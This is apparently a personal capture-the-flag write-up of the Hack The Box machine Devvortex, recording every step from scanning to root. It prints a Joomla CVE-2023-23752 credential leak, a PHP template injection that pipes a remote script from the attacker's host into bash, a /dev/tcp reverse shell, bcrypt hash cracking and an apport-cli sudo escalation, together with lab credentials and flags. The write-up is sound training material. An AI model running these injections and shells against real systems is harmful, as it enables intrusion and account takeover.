---
title: "Devvortex from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# Devvortex from HTB
[page](https://app.hackthebox.com/machines/Devvortex)
`Nmap`gave this:
```bash
nmap -sCV --min-rate 4000 10.10.11.242
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-07 15:06 +04
Nmap scan report for devvortex.htb (10.10.11.242)
Host is up (0.081s latency).
Not shown: 919 filtered tcp ports (no-response), 79 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DevVortex
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.90 seconds
```
Nothing unusual.
Add this to `/etc/hosts`:
```
10.10.11.242 devvortex.htb
```
And access the site. After that I used `ffuf`to list the subdomains and got this:
```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomainstop100000.txt:FUZZ -u http://devvortex.htb -H 'Host: FUZZ.devvortex.htb' -fw 4 - t 100

* FUZZ: dev
```
And then add that to `/etc/hosts`:
```
10.10.11.242 dev.devvortex.htb
```
and go to that subdomain. Also use `ffuf`on that for directory listing:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FFUZ  -u http://dev.devvortex.htb/FFUZ -ic -t 100


images
templates
media
home
modules
plugins
includes
language
components
api
cache
libraries
tmp
layouts
administrator
```
One we need to exploit is `administrator`directory. Go to `dev.devvortex.htb/administrator`and you are greeted with `login`page. This page works on `Joomla`which is written on the bottom of the page. Use program called `joomscan`to get the version of `joomla`:
```bash
joomscan -u http://dev.devvortex.htb

[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 4.2.6
```
Version is `4.2.6`.
Then search exploit for `Joomla 4.2.6`and i got found `Github`repository for the exploit.
https://github.com/ThatNotEasy/CVE-2023-23752.git
I cloned it, then `pip install -r requirements.txt`and then started the script:
```python
[CVE-2023-23752] - Authentication Bypass Information Leak on Joomla!

[1] - Single Scan
[2] - Massive Scan

[CVE-2023-23752]: 1

IP/Domain: http://dev.devvortex.htb/

[CVE-2023-23752] - http://dev.devvortex.htb/ .: [Scanning!]

[+] Domain            : http://dev.devvortex.htb/
[+] Database Type     : mysqli
[+] Database Prefix   : sd4fg_
[+] Database          : joomla
[+] Hostname          : localhost
[+] Username          : lewis
[+] Password          : P4ntherg0t1n5r3c0n##
```
Password ---- `P4ntherg0t1n5r3c0n##`
Username ---- `lewis`
Use that credentials to login.
In `users`directory you can see that `lewis`is `superuser`.
To get the `reverse shell`you need to modify some code. I did it on `error.php`in `system > site templates > cassiopeia Details and Files > error.php` at the end of the script i added this script:
```php
<?php system("curl <your_ip>:<your_port>/<reverse shell script>.sh|bash"); ?>
```
You  will use this to curl the `reverse shell`script that will be on your `PC`, with `python server`.
Modify that script however you want. Then click `save and close.`Go to your terminal and locally create `shell.sh`:
```bash
echo -e '#!/bin/bash\nsh -i >& /dev/tcp/<your_ip>/<port> 0>&1' > shell.sh
```
file is created. Now in same directory start simple `http server`. Then with `curl`do this:
```bash
curl -k "http://dev.devvortex.htb/templates/cassiopeia/error.php/error"
```
```
 -K, --config <file>
 Specify a text file to read curl arguments from. The command line arguments found in the text file are used as if they were provided on the command line.
```
This will execute your written command and on `NetCat`you will get the connection.
```bash
nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.242] 47212
sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/sh")'
$ ls
ls
LICENSE.txt    cli                includes   media       tmp
README.txt     components         index.php  modules     web.config.txt
administrator  configuration.php  language   plugins
api            htaccess.txt       layouts    robots.txt
cache          images             libraries  templates
```
To read the file we have to become the `logan`user.
```bash
$ ss -tlpn
ss -tlpn
State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process
LISTEN    0         70               127.0.0.1:33060            0.0.0.0:*
LISTEN    0         151              127.0.0.1:3306             0.0.0.0:*
```
This shows that there is `mysql`database open locally on `3306`port so we need to access it.
It will need password and username so we have to find it. It is located in `configuration.php` OR you can use the already gotten password and username: `lewis`and `P4ntherg0t1n5r3c0n##`.
First do this:
```bash
$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
 # and then
www-data@devvortex:~/dev.devvortex.htb$ mysql -u lewis -p
mysql -u lewis -p
Enter password: P4ntherg0t1n5r3c0n##

Welcome
```
Then with basic knowledge of `mysql`commands find the password for `logan`:
```sql
mysql> Show databases;
Show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
mysql> use joomla
mysql> show tables;
+-------------------------------+
| Tables_in_joomla              |
+-------------------------------+
........
........
| sd4fg_users                   |
..............
..........
..........
mysql> select * from sd4fg_users;
logan   $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
```
With `hashid`we learn what type of hash it is, and then use `hashcat`on it:
```bash
$ hashid '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12'
Analyzing '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12'
[+] Blowfish(OpenBSD)
[+] Woltlab Burning Board 4.x
[+] bcrypt
$ hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting
$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho
```
Password for `logan`user is `tequieromucho`.
After that become `logan`user and read the `user.txt`:
```bash
su logan
Password: tequieromucho
logan@devvortex:/var/www/dev.devvortex.htb$ cat /home/logan/user.txt
cat /home/logan/user.txt
cc29aa85aa57d20bae0aaf6992c77bbb
```
***
User Flag: `cc29aa85aa57d20bae0aaf6992c77bbb`
***
Then learn what you can do with `root's permission`:
```bash
sudo -l
[sudo] password for logan: tequieromucho

Matching Defaults entries for logan on devvortex:
   env_reset, mail_badpass,
 secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
  (ALL : ALL) /usr/bin/apport-cli
```
With version of `apport-cli`maybe we can do `privilege escalation`:
```bash
/usr/bin/apport-cli --version
2.20.11
```
After bit of searching i decided to read `walktrough`because i didn't understand `shit`and i got this.
```bash
ps -ux
logan       1774  0.0  0.2  19044  9644 ?        Ss   07:40   0:00 /lib/systemd/
# take the PID and use it for privilege escalation
sudo /usr/bin/apport-cli -f -P 1774
*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.
......
*** It seems you have modified the contents of "/etc/systemd/journald.conf".  Would you like to add the contents of it to your bug report?


What would you like to do? Your options are:
  Y: Yes
  N: No
  C: Cancel
Please choose (Y/N/C): y
y^J

*** It seems you have modified the contents of "/etc/systemd/resolved.conf".  Would you like to add the contents of it to your bug report?


What would you like to do? Your options are:
  Y: Yes
  N: No
  C: Cancel
Please choose (Y/N/C):
What would you like to do? Your options are:
  Y: Yes
  N: No
  C: Cancel
Please choose (Y/N/C): y
y^J
....................

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (736.5 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C):
What would you like to do? Your options are:
  S: Send report (736.5 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): V
V^J
WARNING: terminal is not fully functional
-  (press RETURN)
..........................
:!/bin/bash
!//bbiinn//bbaasshh!/bin/bash
root@devvortex:
```
We are `root`now.
***
Root Flag is: 267d54cb5bc85bf5cceeca2d27d790af
***
![](/assets/images/Screenshot from 2024-08-07 15-04-00.png)
